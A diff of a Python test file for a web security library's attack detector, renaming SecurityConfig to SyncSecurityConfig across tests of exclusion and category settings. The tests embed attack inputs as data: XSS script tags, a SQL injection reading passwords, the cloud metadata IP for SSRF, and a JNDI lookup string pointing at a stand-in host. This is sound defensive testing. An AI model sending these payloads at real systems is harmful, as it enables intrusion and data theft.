@@ -4,7 +4,7 @@ from typing import Any
 
 import pytest
 
-from guard_core.models import SecurityConfig
+from guard_core.models import SyncSecurityConfig
 from guard_core.sync.decorators.base import RouteConfig
 from guard_core.sync.handlers.suspatterns_handler import SusPatternsManager
 from guard_core.sync.utils import detect_penetration_attempt
@@ -87,7 +87,7 @@ class _FakeRequest:
 
 
 def test_operator_excluded_header_is_not_scanned_in_any_category() -> None:
-    config = SecurityConfig(excluded_detection_headers={"x-raw"})
+    config = SyncSecurityConfig(excluded_detection_headers={"x-raw"})
     for value in (
         "<script>alert(1)</script>",
         "' UNION SELECT password FROM users--",
@@ -99,7 +99,7 @@ def test_operator_excluded_header_is_not_scanned_in_any_category() -> None:
 
 
 def test_excluded_header_address_value_suppresses_ssrf_only() -> None:
-    config = SecurityConfig(excluded_detection_headers={"x-raw"})
+    config = SyncSecurityConfig(excluded_detection_headers={"x-raw"})
     request = _FakeRequest(headers={"x-raw": "169.254.169.254"})
     _result = detect_penetration_attempt(request, config)
     detected = _result.is_threat
@@ -107,7 +107,7 @@ def test_excluded_header_address_value_suppresses_ssrf_only() -> None:
 
 
 def test_excluded_param_suppresses_match() -> None:
-    config = SecurityConfig(excluded_detection_params={"search"})
+    config = SyncSecurityConfig(excluded_detection_params={"search"})
     request = _FakeRequest(query_params={"search": "<script>alert(1)</script>"})
     _result = detect_penetration_attempt(request, config)
     detected = _result.is_threat
@@ -115,7 +115,7 @@ def test_excluded_param_suppresses_match() -> None:
 
 
 def test_excluded_body_field_suppresses_match() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"notes"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"notes"})
     request = _FakeRequest(
         body_bytes=b'{"notes": "<script>alert(1)</script>"}',
         headers={"content-type": "application/json"},
@@ -126,7 +126,7 @@ def test_excluded_body_field_suppresses_match() -> None:
 
 
 def test_disabled_category_suppresses_match() -> None:
-    config = SecurityConfig(enabled_detection_categories={"sqli"})
+    config = SyncSecurityConfig(enabled_detection_categories={"sqli"})
     request = _FakeRequest(query_params={"q": "<script>alert(1)</script>"})
     _result = detect_penetration_attempt(request, config)
     detected = _result.is_threat
@@ -134,7 +134,7 @@ def test_disabled_category_suppresses_match() -> None:
 
 
 def test_enabled_category_still_matches() -> None:
-    config = SecurityConfig(enabled_detection_categories={"xss"})
+    config = SyncSecurityConfig(enabled_detection_categories={"xss"})
     request = _FakeRequest(query_params={"q": "<script>alert(1)</script>"})
     _result = detect_penetration_attempt(request, config)
     detected = _result.is_threat
@@ -144,7 +144,7 @@ def test_enabled_category_still_matches() -> None:
 
 
 def test_route_exclusion_adds_to_global_header_exclusions() -> None:
-    config = SecurityConfig()
+    config = SyncSecurityConfig()
     route_config = RouteConfig()
     route_config.excluded_detection_headers = {"x-raw"}
     request = _FakeRequest(headers={"x-raw": "169.254.169.254"})
@@ -154,7 +154,7 @@ def test_route_exclusion_adds_to_global_header_exclusions() -> None:
 
 
 def test_route_params_override_global_params() -> None:
-    config = SecurityConfig(excluded_detection_params={"global_only"})
+    config = SyncSecurityConfig(excluded_detection_params={"global_only"})
     route_config = RouteConfig()
     route_config.excluded_detection_params = {"route_only"}
     request = _FakeRequest(query_params={"global_only": "<script>alert(1)</script>"})
@@ -164,28 +164,28 @@ def test_route_params_override_global_params() -> None:
 
 
 def test_scan_body_disabled_suppresses_body_match() -> None:
-    config = SecurityConfig(detection_scan_body=False)
+    config = SyncSecurityConfig(detection_scan_body=False)
     request = _FakeRequest(body_bytes=b'{"id": "<script>alert(1)</script>"}')
     _result = detect_penetration_attempt(request, config)
     assert _result.is_threat is False
 
 
 def test_scan_body_disabled_still_scans_query_params() -> None:
-    config = SecurityConfig(detection_scan_body=False)
+    config = SyncSecurityConfig(detection_scan_body=False)
     request = _FakeRequest(query_params={"q": "<script>alert(1)</script>"})
     _result = detect_penetration_attempt(request, config)
     assert _result.is_threat is True
 
 
 def test_scan_body_enabled_by_default_scans_body() -> None:
-    config = SecurityConfig()
+    config = SyncSecurityConfig()
     request = _FakeRequest(body_bytes=b'{"id": "<script>alert(1)</script>"}')
     _result = detect_penetration_attempt(request, config)
     assert _result.is_threat is True
 
 
 def test_route_scan_body_override_disables_body() -> None:
-    config = SecurityConfig(detection_scan_body=True)
+    config = SyncSecurityConfig(detection_scan_body=True)
     route_config = RouteConfig()
     route_config.detection_scan_body = False
     request = _FakeRequest(body_bytes=b'{"id": "<script>alert(1)</script>"}')
@@ -194,7 +194,7 @@ def test_route_scan_body_override_disables_body() -> None:
 
 
 def test_route_scan_body_override_enables_body() -> None:
-    config = SecurityConfig(detection_scan_body=False)
+    config = SyncSecurityConfig(detection_scan_body=False)
     route_config = RouteConfig()
     route_config.detection_scan_body = True
     request = _FakeRequest(body_bytes=b'{"id": "<script>alert(1)</script>"}')
@@ -218,7 +218,7 @@ def _multipart(boundary: str, *parts: str) -> tuple[bytes, dict[str, str]]:
 
 
 def test_excluded_body_field_suppresses_nested_match() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"content"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"content"})
     body = json.dumps(
         {"messages": [{"role": "user", "content": "<script>alert(1)</script>"}]}
     ).encode()
@@ -228,7 +228,7 @@ def test_excluded_body_field_suppresses_nested_match() -> None:
 
 
 def test_nested_non_excluded_field_still_matches() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"content"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"content"})
     body = json.dumps({"outer": {"note": "<script>alert(1)</script>"}}).encode()
     request = _FakeRequest(body_bytes=body, headers=_JSON)
     _result = detect_penetration_attempt(request, config)
@@ -236,7 +236,7 @@ def test_nested_non_excluded_field_still_matches() -> None:
 
 
 def test_top_level_json_array_recurses() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"safe"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"safe"})
     body = json.dumps([{"note": "<script>alert(1)</script>"}]).encode()
     request = _FakeRequest(body_bytes=body, headers=_JSON)
     _result = detect_penetration_attempt(request, config)
@@ -244,7 +244,7 @@ def test_top_level_json_array_recurses() -> None:
 
 
 def test_non_excluded_form_field_matches_decoded() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"other"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"other"})
     body = b"message=%3Cscript%3Ealert(1)%3C%2Fscript%3E&other=hi"
     request = _FakeRequest(body_bytes=body, headers=_FORM)
     _result = detect_penetration_attempt(request, config)
@@ -252,7 +252,7 @@ def test_non_excluded_form_field_matches_decoded() -> None:
 
 
 def test_excluded_form_field_suppresses_decoded_match() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"message"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"message"})
     body = b"message=%3Cscript%3Ealert(1)%3C%2Fscript%3E&other=hi"
     request = _FakeRequest(body_bytes=body, headers=_FORM)
     _result = detect_penetration_attempt(request, config)
@@ -260,7 +260,7 @@ def test_excluded_form_field_suppresses_decoded_match() -> None:
 
 
 def test_multipart_file_part_excluded_suppressed() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"file"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"file"})
     body, headers = _multipart(
         "B0",
         'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n'
@@ -272,7 +272,7 @@ def test_multipart_file_part_excluded_suppressed() -> None:
 
 
 def test_multipart_file_part_non_excluded_matches() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"unused"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"unused"})
     body, headers = _multipart(
         "B0",
         'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n'
@@ -284,7 +284,7 @@ def test_multipart_file_part_non_excluded_matches() -> None:
 
 
 def test_multipart_text_part_excluded_suppressed() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"note"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"note"})
     body, headers = _multipart(
         "B0",
         'Content-Disposition: form-data; name="note"\r\n\r\n<script>alert(1)</script>',
@@ -295,7 +295,7 @@ def test_multipart_text_part_excluded_suppressed() -> None:
 
 
 def test_multipart_text_part_non_excluded_matches() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"other"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"other"})
     body, headers = _multipart(
         "B0",
         'Content-Disposition: form-data; name="note"\r\n\r\n<script>alert(1)</script>',
@@ -306,7 +306,7 @@ def test_multipart_text_part_non_excluded_matches() -> None:
 
 
 def test_multipart_unparseable_body_falls_back_to_blob() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"unused"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"unused"})
     request = _FakeRequest(
         body_bytes=b"<script>alert(1)</script>",
         headers={"content-type": "multipart/form-data; boundary=Z9"},
@@ -316,7 +316,7 @@ def test_multipart_unparseable_body_falls_back_to_blob() -> None:
 
 
 def test_multipart_part_without_name_is_scanned() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"unused"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"unused"})
     body, headers = _multipart(
         "B0", "Content-Disposition: form-data\r\n\r\n<script>alert(1)</script>"
     )
@@ -326,7 +326,7 @@ def test_multipart_part_without_name_is_scanned() -> None:
 
 
 def test_multipart_part_without_name_not_suppressed_by_fallback_label() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"file"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"file"})
     body, headers = _multipart(
         "B0", "Content-Disposition: form-data\r\n\r\n<script>alert(1)</script>"
     )
@@ -336,7 +336,7 @@ def test_multipart_part_without_name_not_suppressed_by_fallback_label() -> None:
 
 
 def test_multipart_scans_second_text_part_when_first_is_clean() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"unused"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"unused"})
     body, headers = _multipart(
         "B0",
         'Content-Disposition: form-data; name="a"\r\n\r\nhello world',
@@ -348,7 +348,7 @@ def test_multipart_scans_second_text_part_when_first_is_clean() -> None:
 
 
 def test_route_categories_override_global_categories() -> None:
-    config = SecurityConfig(enabled_detection_categories={"xss", "sqli"})
+    config = SyncSecurityConfig(enabled_detection_categories={"xss", "sqli"})
     route_config = RouteConfig()
     route_config.enabled_detection_categories = {"sqli"}
     request = _FakeRequest(query_params={"q": "<script>alert(1)</script>"})
@@ -358,7 +358,7 @@ def test_route_categories_override_global_categories() -> None:
 
 
 def test_route_config_none_fields_inherit_from_config() -> None:
-    config = SecurityConfig(excluded_detection_params={"inherit_me"})
+    config = SyncSecurityConfig(excluded_detection_params={"inherit_me"})
     route_config = RouteConfig()
     request = _FakeRequest(query_params={"inherit_me": "<script>alert(1)</script>"})
     _result = detect_penetration_attempt(request, config, route_config)
@@ -374,7 +374,7 @@ def test_no_config_preserves_legacy_behaviour() -> None:
 
 
 def test_route_body_fields_override_global() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"notes"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"notes"})
     route_config = RouteConfig()
     route_config.excluded_detection_body_fields = {"comments"}
     request = _FakeRequest(body_bytes=b'{"notes": "<script>alert(1)</script>"}')
@@ -384,7 +384,7 @@ def test_route_body_fields_override_global() -> None:
 
 
 def test_url_path_uses_enabled_categories() -> None:
-    config = SecurityConfig(enabled_detection_categories={"xss"})
+    config = SyncSecurityConfig(enabled_detection_categories={"xss"})
     request = _FakeRequest(url_path="/.git/index")
     _result = detect_penetration_attempt(request, config)
     detected = _result.is_threat
@@ -392,7 +392,7 @@ def test_url_path_uses_enabled_categories() -> None:
 
 
 def test_request_body_non_json_falls_back_to_full_scan() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"notes"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"notes"})
     request = _FakeRequest(body_bytes=b"<script>alert(1)</script>")
     _result = detect_penetration_attempt(request, config)
     detected = _result.is_threat
@@ -400,7 +400,7 @@ def test_request_body_non_json_falls_back_to_full_scan() -> None:
 
 
 def test_request_body_invalid_json_with_excluded_body_fields() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"notes"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"notes"})
     request = _FakeRequest(body_bytes=b"not valid json <script>alert(1)</script>")
     _result = detect_penetration_attempt(request, config)
     detected = _result.is_threat
@@ -408,7 +408,7 @@ def test_request_body_invalid_json_with_excluded_body_fields() -> None:
 
 
 def test_request_body_declared_json_but_malformed_falls_back_to_full_scan() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"notes"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"notes"})
     request = _FakeRequest(
         body_bytes=b"not valid json <script>alert(1)</script>",
         headers={"content-type": "application/json"},
@@ -419,7 +419,7 @@ def test_request_body_declared_json_but_malformed_falls_back_to_full_scan() -> N
 
 
 def test_request_body_declared_json_scalar_falls_back_to_full_scan() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"notes"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"notes"})
     request = _FakeRequest(
         body_bytes=b'"<script>alert(1)</script>"',
         headers={"content-type": "application/json"},
@@ -443,7 +443,7 @@ def test_request_body_decode_failure_returns_false() -> None:
 
 
 def test_request_body_field_threat_returns_field_message() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"safe"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"safe"})
     request = _FakeRequest(
         body_bytes=b'{"q": "<script>alert(1)</script>"}',
         headers={"content-type": "application/json"},
@@ -490,7 +490,7 @@ def test_unknown_client_host_is_handled() -> None:
 
 
 def test_body_loop_iterates_past_safe_field_to_detect_threat() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"placeholder"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"placeholder"})
     body = b'{"safe": "harmless", "evil": "<script>alert(1)</script>"}'
     request = _FakeRequest(
         body_bytes=body, headers={"content-type": "application/json"}
@@ -503,7 +503,7 @@ def test_body_loop_iterates_past_safe_field_to_detect_threat() -> None:
 
 
 def test_excluded_body_field_with_other_threat_field_still_detects() -> None:
-    config = SecurityConfig(excluded_detection_body_fields={"notes"})
+    config = SyncSecurityConfig(excluded_detection_body_fields={"notes"})
     body = (
         b'{"notes": "<script>alert(1)</script>", "other": "<script>alert(2)</script>"}'
     )
@@ -518,7 +518,7 @@ def test_excluded_body_field_with_other_threat_field_still_detects() -> None:
 
 
 def test_excluded_header_all_enabled_categories_excluded_skips_scan() -> None:
-    config = SecurityConfig(enabled_detection_categories={"ssrf"})
+    config = SyncSecurityConfig(enabled_detection_categories={"ssrf"})
     request = _FakeRequest(headers={"x-real-ip": "169.254.169.254"})
     _result = detect_penetration_attempt(request, config)
     detected = _result.is_threat
@@ -527,7 +527,7 @@ def test_excluded_header_all_enabled_categories_excluded_skips_scan() -> None:
 
 def test_operator_excluded_header_name_is_skipped_with_its_value() -> None:
     malicious_name = "${jndi:ldap://evil.example/a}"
-    config = SecurityConfig(excluded_detection_headers={malicious_name})
+    config = SyncSecurityConfig(excluded_detection_headers={malicious_name})
     request = _FakeRequest(headers={malicious_name: "benign"})
     _result = detect_penetration_attempt(request, config)
     assert _result.is_threat is False
